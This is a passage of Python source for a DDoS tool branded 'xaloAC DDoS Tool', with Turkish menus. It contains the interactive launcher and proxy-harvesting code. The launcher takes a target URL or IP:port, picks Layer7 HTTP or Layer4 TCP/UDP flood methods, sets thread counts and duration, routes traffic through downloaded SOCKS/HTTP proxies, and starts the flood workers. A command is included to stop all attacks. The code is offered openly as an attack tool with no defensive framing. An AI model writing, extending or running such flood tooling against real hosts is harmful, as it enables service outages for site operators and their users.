        with ThreadPoolExecutor(len(providers)) as ex:
            futures = {ex.submit(ProxyManager.download, p, ProxyType.stringToProxyType(str(p["type"]))): p for p in providers}
            for f in as_completed(futures):
                for pro in f.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, pt):
        proxes = set()
        with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), pt):
                    proxes.add(proxy)
            except: pass
        return proxes

class ToolsConsole:
    METHODS = {"INFO","PING","CHECK","DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@xaloAC:~#"
        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            cmd = cmd.upper()
            if cmd in {"EXIT","QUIT","BACK"}: break
            if cmd == "HELP":
                print("Tools:", ", ".join(ToolsConsole.METHODS))
                continue
            if cmd == "CLEAR":
                print("\033c")
                continue
            if cmd == "PING":
                domain = input("Domain: ").strip()
                r = ping(domain, count=4, interval=0.2)
                print(f"Ping: {r.avg_rtt}ms | {'ONLINE' if r.is_alive else 'OFFLINE'}")
                continue
            if cmd == "INFO":
                domain = input("Domain: ").strip()
                with suppress(Exception), get(f"https://ipwhois.app/json/{domain}") as r:
                    data = r.json()
                    print(f"Country: {data.get('country')} | City: {data.get('city')} | ISP: {data.get('isp')}")
                continue
            if cmd == "CHECK":
                url = input("URL: ").strip()
                with suppress(Exception):
                    with get(url, timeout=10) as r:
                        print(f"Status: {r.status_code}")
                continue
            if cmd == "DSTAT":
                print(f"CPU: %{cpu_percent()} | RAM: %{virtual_memory().percent}")
                continue
            print(f"{cmd} not found")

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print(f"""
* xaloAC DDoS Tool v{__version__} - by x410m1s0
* {len(Methods.ALL_METHODS)} Methods

Usage:
  python {argv[0]} - Interactive menu
  python {argv[0]} HELP - Show help
  python {argv[0]} TOOLS - Tools console
  python {argv[0]} STOP - Stop all attacks
""")

def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4,5,1,0,6}:
        exit("Socks Type Not Found [4,5,1,0,6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4,5,1])
    if not proxy_li.exists():
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
            Proxies = ProxyChecker.checkAll(Proxies, timeout=5, threads=100,
                                            url=url.human_repr() if url else "http://httpbin.org/get")
            if not Proxies:
                exit("Proxy Check failed")
            wr.write("\n".join(p.__str__() for p in Proxies))
    proxies = ProxyUtiles.readFromFile(proxy_li)
    return proxies if proxies else None

def dosya_oku(dosya):
    p = Path(__dir__ / "files" / dosya)
    if p.exists():
        return set(a.strip() for a in p.open("r+").readlines() if a.strip())
    return set()

def interaktif_menu():
    while True:
        banner()
        print(f"""{KOYU_MOR}{PARLAK}
  ╔═══════════════════════════════════════════════════════╗
  ║                   ANA MENÜ                            ║
  ╠═══════════════════════════════════════════════════════╣
  ║                                                       ║
  ║  {SARI}[1]{SIFIRLA}  {BEYAZ}Layer7 Saldırısı (Web/HTTP){SIFIRLA}                    ║
  ║  {SARI}[2]{SIFIRLA}  {BEYAZ}Layer4 Saldırısı (Ağ/TCP-UDP){SIFIRLA}                 ║
  ║  {SARI}[3]{SIFIRLA}  {BEYAZ}Metot Listesi{SIFIRLA}                              ║
  ║  {SARI}[4]{SIFIRLA}  {BEYAZ}Araçlar{SIFIRLA}                                    ║
  ║  {SARI}[5]{SIFIRLA}  {BEYAZ}Yardım{SIFIRLA}                                     ║
  ║  {SARI}[0]{SIFIRLA}  {KIRMIZI}Çıkış{SIFIRLA}                                     ║
  ║                                                       ║
  ╚═══════════════════════════════════════════════════════╝{SIFIRLA}
""")
        secim = input(f"{KOYU_MOR}  Seçim: {SIFIRLA}").strip()
        if secim == "1": layer7_menu()
        elif secim == "2": layer4_menu()
        elif secim == "3": metot_listesi()
        elif secim == "4": araclar_menu()
        elif secim == "5":
            ToolsConsole.usage()
            input(f"\n{SARI}  [Enter] Menüye dön...{SIFIRLA}")
        elif secim == "0":
            print(f"{KIRMIZI}  Çıkış yapılıyor...{SIFIRLA}")
            _exit(0)

def layer7_menu():
    while True:
        banner()
        print(f"{KOYU_MOR}{PARLAK}  ═══ LAYER7 SALDIRISI ═══{SIFIRLA}\n")
        print(f"{SARI}  Hedef URL (örn: https://example.com):{SIFIRLA}")
        url_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
        if not url_giris.startswith("http"): url_giris = "http://" + url_giris

        metotlar = sorted(Methods.LAYER7_METHODS)
        while True:
            print(f"\n{SARI}  Metotlar:{SIFIRLA}")
            for i, m in enumerate(metotlar, 1):
                print(f"  {CYAN}{i:2d}. {m}{SIFIRLA}")
            print(f"{SARI}  Metot seç (1-{len(metotlar)}):{SIFIRLA}")
            metot_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if metot_giris.isdigit() and 1 <= int(metot_giris) <= len(metotlar):
                metot = metotlar[int(metot_giris) - 1]
                break
            print(f"{KIRMIZI}  [!] Geçersiz seçim! 1-{len(metotlar)} arası sayı girin.{SIFIRLA}")

        while True:
            print(f"\n{SARI}  Socks Tipi:{SIFIRLA}")
            print(f"  {CYAN}0. Yok{SIFIRLA}")
            print(f"  {CYAN}1. HTTP{SIFIRLA}")
            print(f"  {CYAN}4. SOCKS4{SIFIRLA}")
            print(f"  {CYAN}5. SOCKS5{SIFIRLA}")
            print(f"  {CYAN}6. Random{SIFIRLA}")
            print(f"{SARI}  Seç (0-6):{SIFIRLA}")
            pt_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if pt_giris == "": pt_giris = "0"
            if pt_giris.isdigit() and int(pt_giris) in {0,1,4,5,6}:
                proxy_ty = int(pt_giris)
                break
            print(f"{KIRMIZI}  [!] Geçersiz! 0,1,4,5,6 girin.{SIFIRLA}")

        while True:
            print(f"\n{SARI}  Thread sayısı:{SIFIRLA}")
            th_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if th_giris.isdigit() and int(th_giris) > 0:
                threads = int(th_giris)
                break
            print(f"{KIRMIZI}  [!] Pozitif sayı girin.{SIFIRLA}")

        print(f"\n{SARI}  Proxy dosyası (örn: http.txt veya boş):{SIFIRLA}")
        proxy_dosya = input(f"{KOYU_MOR}  → {SIFIRLA}").strip() or "http.txt"

        while True:
            print(f"\n{SARI}  RPC (istek/bağlantı):{SIFIRLA}")
            rpc_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if rpc_giris == "": rpc_giris = "1"
            if rpc_giris.isdigit() and int(rpc_giris) > 0:
                rpc = int(rpc_giris)
                break
            print(f"{KIRMIZI}  [!] Pozitif sayı girin.{SIFIRLA}")

        while True:
            print(f"\n{SARI}  Süre (saniye):{SIFIRLA}")
            sure_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if sure_giris.isdigit() and int(sure_giris) > 0:
                sure = int(sure_giris)
                break
            print(f"{KIRMIZI}  [!] Pozitif sayı girin.{SIFIRLA}")

        saldiri_l7(url_giris, metot, proxy_ty, threads, proxy_dosya, rpc, sure)
        break

def layer4_menu():
    while True:
        banner()
        print(f"{KOYU_MOR}{PARLAK}  ═══ LAYER4 SALDIRISI ═══{SIFIRLA}\n")
        print(f"{SARI}  Hedef IP:Port (örn: 1.2.3.4:80):{SIFIRLA}")
        hedef = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
        if ":" not in hedef:
            print(f"{KIRMIZI}  [!] Format: IP:PORT{SIFIRLA}")
            continue

        metotlar = sorted(Methods.LAYER4_METHODS)
        while True:
            print(f"\n{SARI}  Metotlar:{SIFIRLA}")
            for i, m in enumerate(metotlar, 1):
                print(f"  {CYAN}{i:2d}. {m}{SIFIRLA}")
            print(f"{SARI}  Metot seç (1-{len(metotlar)}):{SIFIRLA}")
            metot_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if metot_giris.isdigit() and 1 <= int(metot_giris) <= len(metotlar):
                metot = metotlar[int(metot_giris) - 1]
                break
            print(f"{KIRMIZI}  [!] Geçersiz seçim! 1-{len(metotlar)} arası sayı girin.{SIFIRLA}")

        while True:
            print(f"\n{SARI}  Thread sayısı:{SIFIRLA}")
            th_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if th_giris.isdigit() and int(th_giris) > 0:
                threads = int(th_giris)
                break
            print(f"{KIRMIZI}  [!] Pozitif sayı girin.{SIFIRLA}")

        while True:
            print(f"\n{SARI}  Süre (saniye):{SIFIRLA}")
            sure_giris = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
            if sure_giris.isdigit() and int(sure_giris) > 0:
                sure = int(sure_giris)
                break
            print(f"{KIRMIZI}  [!] Pozitif sayı girin.{SIFIRLA}")

        saldiri_l4(hedef, metot, threads, sure)
        break

def saldiri_l7(url, metot, proxy_ty, threads, proxy_dosya, rpc, sure):
    banner()
    print(f"{KIRMIZI}{PARLAK}  SALDIRI BAŞLATILIYOR{SIFIRLA}\n")
    print(f"{CYAN}  Hedef: {url} | Metot: {metot} | Thread: {threads} | Süre: {sure}sn{SIFIRLA}\n")
    sleep(1)
    try:
        url_obj = URL(url)
        host = gethostbyname(url_obj.host)
        event = Event()
        event.set()
        proxy_li = Path(__dir__ / "files/proxies" / proxy_dosya)
        uagents = dosya_oku("useragent.txt")
        referers = dosya_oku("referers.txt")
        proxies = None
        if proxy_ty > 0:
            proxies = handleProxyList(con, proxy_li, proxy_ty, url_obj)
        for i in range(threads):
            HttpFlood(i, url_obj, host, metot, rpc, event, uagents, referers, proxies).start()
        ts = time()
        while time() < ts + sure:
            logger.info(f'PPS: {Tools.humanformat(int(REQUESTS_SENT))} | BPS: {Tools.humanbytes(int(BYTES_SEND))} | %{round((time()-ts)/sure*100)}')
            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            sleep(1)
        event.clear()
        print(f"\n{YEŞIL}  Saldırı tamamlandı!{SIFIRLA}")
    except Exception as e:
        print(f"\n{KIRMIZI}  Hata: {e}{SIFIRLA}")
    input(f"\n{SARI}  [Enter] Menüye dön...{SIFIRLA}")

def saldiri_l4(hedef, metot, threads, sure):
    banner()
    print(f"{KIRMIZI}{PARLAK}  SALDIRI BAŞLATILIYOR{SIFIRLA}\n")
    try:
        ip, port = hedef.split(":")
        port = int(port)
        ip = gethostbyname(ip)
        event = Event()
        event.set()
        for _ in range(threads):
            Layer4((ip, port), method=metot, synevent=event).start()
        ts = time()
        while time() < ts + sure:
            logger.info(f'PPS: {Tools.humanformat(int(REQUESTS_SENT))} | %{round((time()-ts)/sure*100)}')
            REQUESTS_SENT.set(0)
            sleep(1)
        event.clear()
        print(f"\n{YEŞIL}  Saldırı tamamlandı!{SIFIRLA}")
    except Exception as e:
        print(f"\n{KIRMIZI}  Hata: {e}{SIFIRLA}")
    input(f"\n{SARI}  [Enter] Menüye dön...{SIFIRLA}")

def metot_listesi():
    banner()
    print(f"{KOYU_MOR}{PARLAK}  ═══ METOT LİSTESİ ═══{SIFIRLA}\n")
    print(f"{SARI}  Layer7 ({len(Methods.LAYER7_METHODS)}):{SIFIRLA}")
    for i, m in enumerate(sorted(Methods.LAYER7_METHODS), 1):
        print(f"  {CYAN}{i:2d}. {m}{SIFIRLA}")
    print(f"\n{SARI}  Layer4 ({len(Methods.LAYER4_METHODS)}):{SIFIRLA}")
    for i, m in enumerate(sorted(Methods.LAYER4_METHODS), 1):
        print(f"  {CYAN}{i:2d}. {m}{SIFIRLA}")
    input(f"\n{SARI}  [Enter] Menüye dön...{SIFIRLA}")

def araclar_menu():
    while True:
        banner()
        print(f"{KOYU_MOR}{PARLAK}  ═══ ARAÇLAR ═══{SIFIRLA}\n")
        print(f"{SARI}  [1] Ping Testi{SIFIRLA}")
        print(f"{SARI}  [2] IP Bilgisi{SIFIRLA}")
        print(f"{SARI}  [3] Site Durumu{SIFIRLA}")
        print(f"{SARI}  [4] Sistem İstatistiği{SIFIRLA}")
        print(f"{SARI}  [5] Araç Konsolu{SIFIRLA}")
        print(f"{SARI}  [0] Geri dön{SIFIRLA}\n")
        secim = input(f"{KOYU_MOR}  → {SIFIRLA}").strip()
        if secim == "1":
            domain = input(f"{SARI}  Domain/IP: {SIFIRLA}").strip()
            domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
            r = ping(domain, count=4, interval=0.2)
            if r.is_alive:
                print(f"{YESIL}  {r.address} | {r.avg_rtt}ms | {r.packets_received}/{r.packets_sent}{SIFIRLA}")
            else:
                print(f"{KIRMIZI}  Hedef çevrimdışı{SIFIRLA}")
        elif secim == "2":
            domain = input(f"{SARI}  Domain/IP: {SIFIRLA}").strip()
            with suppress(Exception), get(f"https://ipwhois.app/json/{domain}") as r:
                data = r.json()
                if data.get("success"):
                    print(f"{YESIL}  Ülke: {data.get('country')} | Şehir: {data.get('city')} | ISP: {data.get('isp')}{SIFIRLA}")
                else:
                    print(f"{KIRMIZI}  Bilgi alınamadı{SIFIRLA}")
        elif secim == "3":
            url = input(f"{SARI}  URL: {SIFIRLA}").strip()
            with suppress(Exception):
                with get(url, timeout=10) as r:
                    print(f"{YESIL}  Status: {r.status_code}{SIFIRLA}")
        elif secim == "4":
            print(f"{CYAN}  CPU: %{cpu_percent()} | RAM: %{virtual_memory().percent}{SIFIRLA}")
            ld = net_io_counters()
            print(f"{CYAN}  Gönderilen: {Tools.humanbytes(ld.bytes_sent)} | Alınan: {Tools.humanbytes(ld.bytes_recv)}{SIFIRLA}")
        elif secim == "5":
            ToolsConsole.runConsole()
        elif secim == "0":
            break
        if secim != "5":
            input(f"\n{SARI}  [Enter] Devam...{SIFIRLA}")

if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        if len(argv) > 1:
            komut = argv[1].upper()
            if komut == "HELP":
                ToolsConsole.usage()
            elif komut == "TOOLS":
                ToolsConsole.runConsole()
            elif komut == "STOP":
                ToolsConsole.stop()
            else:
                print(f"{KIRMIZI}  Geçersiz komut. 'python start.py' yazın.{SIFIRLA}")
        else:
            interaktif_menu()